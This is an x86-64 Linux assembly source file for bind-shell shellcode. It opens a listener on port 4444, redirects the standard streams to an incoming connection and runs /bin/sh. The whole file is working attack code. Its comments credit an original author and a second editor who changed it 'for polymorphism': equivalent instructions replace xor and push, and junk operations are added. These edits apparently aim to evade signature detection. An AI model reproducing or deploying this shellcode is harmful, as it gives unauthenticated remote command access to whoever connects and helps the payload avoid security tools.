;linux/x86-64  bindshell(port 4444)
;xi4oyu [at] 80sec.com
;http://www.80sec.com
;edit for polymorphism by clubjk 
 
global start

section .text

_start:



;;xor eax,eax edited for polymorphism by clubjk
mov rbx, rax
sub rax, rbx

;;xor ebx,ebx edited for polymorphism by clubjk
mov rcx, rbx
sub rbx, rcx

;;xor edx,edx edited for polymorphism by clubjk
mov rcx, rdx
sub rdx, rcx


;socket
mov al,0x1
mov esi,eax
inc al
mov edi,eax
mov dl,0x6
mov al,0x29
syscall
xchg ebx,eax ;store the server sock
;bind

;;xor  rax,rax edited for polymorphism by clubjk
mov rbx, rax
sub rax, rbx


;;push   rax edited for polymorphism by clubjk
mov qword [rsp-8], rax
sub rsp, 8


push 0x5c110102
mov  [rsp+1],al
mov  rsi,rsp
mov  dl,0x10
mov  edi,ebx
mov  al,0x31
syscall
;listen
mov  al,0x5
mov esi,eax
mov  edi,ebx
mov  al,0x32
syscall
;accept
xor edx,edx
xor esi,esi
mov edi,ebx
mov al,0x2b
syscall
mov edi,eax ; store sock
;dup2

;;xor rax,rax edited for polymorphism by clubjk
mov rbx, rax
sub rax, rbx

mov esi,eax
mov al,0x21
syscall
inc al
mov esi,eax
mov al,0x21
syscall
inc al
mov esi,eax
mov al,0x21
syscall
;exec
xor rdx,rdx
mov rbx,0x68732f6e69622fff
shr rbx,0x8

;;push rbx edited for polymorphism by clubjk
mov qword [rsp-8], rbx
sub rsp, 8

;;garbage add for polymorphism by clubjk
add rcx, 10
xor rcx, rcx

mov rdi,rsp

;;xor rax,rax edited for polymorphism by clubjk
mov rbx, rax
sub rax, rbx

;;push rax edited for polymorphism by clubjk
mov qword [rsp-8], rax
sub rsp, 8

push rdi
mov  rsi,rsp
mov al,0x3b
syscall

;;push rax edited for polymorphism by clubjk
mov qword [rsp-8], rax
sub rsp, 8

pop  rdi
mov al,0x3c
syscall
